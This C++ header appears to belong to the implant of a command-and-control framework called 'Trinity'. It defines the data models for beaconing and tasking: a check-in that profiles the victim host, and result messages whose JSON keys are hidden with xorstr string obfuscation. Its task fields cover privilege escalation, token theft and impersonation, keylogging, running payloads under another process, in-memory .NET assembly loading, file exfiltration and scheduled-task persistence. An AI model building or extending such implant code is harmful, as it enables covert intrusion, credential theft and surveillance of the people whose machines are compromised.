// ========================================== { START OF FILE } ========================================== //
#pragma once

#include <cstdint>
#include <string>
#include <vector>

#include "xorstr/xorstr.hpp"
#include "rapidjson/document.h"
#include "rapidjson/stringbuffer.h"
#include "rapidjson/writer.h"

namespace agent::models {

    struct InitialCheckinRequest {
        std::string internal_ip;
        std::string external_ip;
        std::string os;
        std::string username;
        std::string process_name;
        int pid = 0;
        std::string integrity;
        std::string mac_address;
        std::string motherboard;
        int ram_mb = 0;
        double disk_total_gb = 0.0;
        double disk_free_gb = 0.0;
        int cpu_count = 0;

        [[nodiscard]] std::string ToJson() const {
            rapidjson::Document doc;
            doc.SetObject();
            auto& alloc = doc.GetAllocator();

            doc.AddMember("internalIP", rapidjson::Value(internal_ip.c_str(), alloc), alloc);
            doc.AddMember("externalIP", rapidjson::Value(external_ip.c_str(), alloc), alloc);
            doc.AddMember("OS", rapidjson::Value(os.c_str(), alloc), alloc);
            doc.AddMember("user", rapidjson::Value(username.c_str(), alloc), alloc);
            doc.AddMember("processName", rapidjson::Value(process_name.c_str(), alloc), alloc);
            doc.AddMember("Integrity", rapidjson::Value(integrity.c_str(), alloc), alloc);
            doc.AddMember("macAddress", rapidjson::Value(mac_address.c_str(), alloc), alloc);
            doc.AddMember("motherboard", rapidjson::Value(motherboard.c_str(), alloc), alloc);
            doc.AddMember("PID", pid, alloc);
            doc.AddMember("RAM", ram_mb, alloc);
            doc.AddMember("DiskSize", disk_total_gb, alloc);
            doc.AddMember("FreeDisk", disk_free_gb, alloc);
            doc.AddMember("CPUCount", cpu_count, alloc);

            rapidjson::StringBuffer buf;
            rapidjson::Writer<rapidjson::StringBuffer> writer(buf);
            doc.Accept(writer);
            return buf.GetString();
        }
    };

    /// <summary>
    /// Task result envelope. The wire keys and the Status value mirror the server side
    /// TaskResp&lt;T&gt; DTO (TaskID/TaskType/TaskCode/Status/Data), and Status uses the server's
    /// Status enum: ERROR = 1, SUCCESS = 2.
    /// <para>
    /// Data is polymorphic on the server: a SUCCESS result deserialises Data into
    /// TaskSuccessResponse { Output }, while an ERROR result deserialises it into
    /// Trinity.Shared.DTOs.Task.Error { ErrorCode, Message }. Sending the success shape with
    /// Status=ERROR leaves Message empty and the diagnostic is lost.
    /// </para>
    /// </summary>
    struct ResultRequest {
        /// ErrorCode reported to the server when the task failed. The server stores it as-is;
        /// the client shows Message.
        static constexpr int kErrorCodeCommandRejected = 1;

        int task_id = 0;
        int task_type = 0;
        int task_code = 0;
        bool is_successful = true;
        /// Data.Output on success, Data.Message on failure.
        std::string output;
        int error_code = kErrorCodeCommandRejected;

        [[nodiscard]] std::string ToJson() const {
            // rapidjson::StringRef is non-owning (kConstStringFlag), so the xorstr_ temporaries
            // would be re-encrypted before serialisation. Copy each key into a std::string that
            // outlives the writer instead.
            const std::string k_task_id{xorstr_("TaskID")};
            const std::string k_task_type{xorstr_("TaskType")};
            const std::string k_task_code{xorstr_("TaskCode")};
            const std::string k_status{xorstr_("Status")};
            const std::string k_data{xorstr_("Data")};
            const std::string k_output{xorstr_("Output")};
            const std::string k_error_code{xorstr_("ErrorCode")};
            const std::string k_message{xorstr_("Message")};

            rapidjson::Document doc;
            doc.SetObject();
            auto& alloc = doc.GetAllocator();

            doc.AddMember(rapidjson::StringRef(k_task_id.c_str()), task_id, alloc);
            doc.AddMember(rapidjson::StringRef(k_task_type.c_str()), task_type, alloc);
            doc.AddMember(rapidjson::StringRef(k_task_code.c_str()), task_code, alloc);
            doc.AddMember(rapidjson::StringRef(k_status.c_str()), is_successful ? 2 : 1, alloc);

            rapidjson::Value data(rapidjson::kObjectType);
            if (is_successful) {
                data.AddMember(rapidjson::StringRef(k_output.c_str()), rapidjson::Value(output.c_str(), alloc), alloc);
            } else {
                data.AddMember(rapidjson::StringRef(k_error_code.c_str()), error_code, alloc);
                data.AddMember(rapidjson::StringRef(k_message.c_str()), rapidjson::Value(output.c_str(), alloc), alloc);
            }
            doc.AddMember(rapidjson::StringRef(k_data.c_str()), data, alloc);

            rapidjson::StringBuffer buf;
            rapidjson::Writer<rapidjson::StringBuffer> writer(buf);
            doc.Accept(writer);
            return buf.GetString();
        }
    };

    struct PowershellCommand {
        std::string commandlet;
        std::string arguments;
    };

    struct CheckinResponse {
        int id = 0;
        int type = 0;
        int code = 0;
        /// False when the task carried no parseable "Command" member. The dispatcher reports this
        /// as an error naming the missing field instead of dropping the task silently.
        bool has_command = false;
        PowershellCommand command;
        int pid = 0;                // Populated for KILL_PROCESS / RUN_U tasks (Command.PID).
        std::string reg_key;        // Populated for ESCALATE tasks (Command.RegKey).
        std::string target_binary;  // Populated for ESCALATE tasks (Command.TargetBinary).
        std::string run_command;    // Populated for RUN_U tasks (Command.Command); the payload to run under the PID.
        std::string operation;  // Populated for TOKEN/KEYLOGGER tasks (Command.Operation): "make", "steal", "rev2self",
                                // "start", "stop".
        std::string username;   // Populated for TOKEN "make" and WIN_TASK tasks (Command.Username).
        std::string password;   // Populated for TOKEN "make" tasks (Command.Password).
        std::string file_path;  // Populated for UPLOAD/DOWNLOAD and WIN_TASK tasks (Command.Path).
        std::string transfer_id;  // Populated for UPLOAD/DOWNLOAD tasks; server-side transfer identifier.
        std::string task_name;    // Populated for WIN_TASK tasks (Command.TaskName): the scheduled task name.
        std::string program;      // Populated for PROCESS/RUN tasks (Command.Program).
        std::vector<std::string> hosts;  // Populated for SET/UPDATE_HOSTS (Command.Hosts).
        int sleep_ms = 0;         // Populated for PROCESS/SLEEP tasks (Command.Sleep).
        int jitter = 0;           // Populated for PROCESS/SLEEP tasks (Command.Jitter): percent.
        std::string assembly;     // Populated for NET_ASM tasks (Command.Assembly): the base64 assembly image.
                                  // Its argument vector arrives in command.arguments (Command.Arguements).

        // Chunked download. The server rewrites a DOWNLOAD task into Trinity.Shared's
        // DownloadChunkPayload, so the agent receives the bytes at an offset instead of a URL.
        std::string chunk_data;              // Command.Data: base64 bytes of this chunk.
        std::int64_t chunk_offset = 0;       // Command.Offset: where the decoded bytes belong in the file.
        std::int64_t chunk_total_bytes = 0;  // Command.TotalBytes: size of the whole file (0 when unknown).
        bool chunk_final = false;            // Command.Final: this chunk completes the file.
    };

}  // namespace agent::models
// ========================================== { END OF FILE } ========================================== //
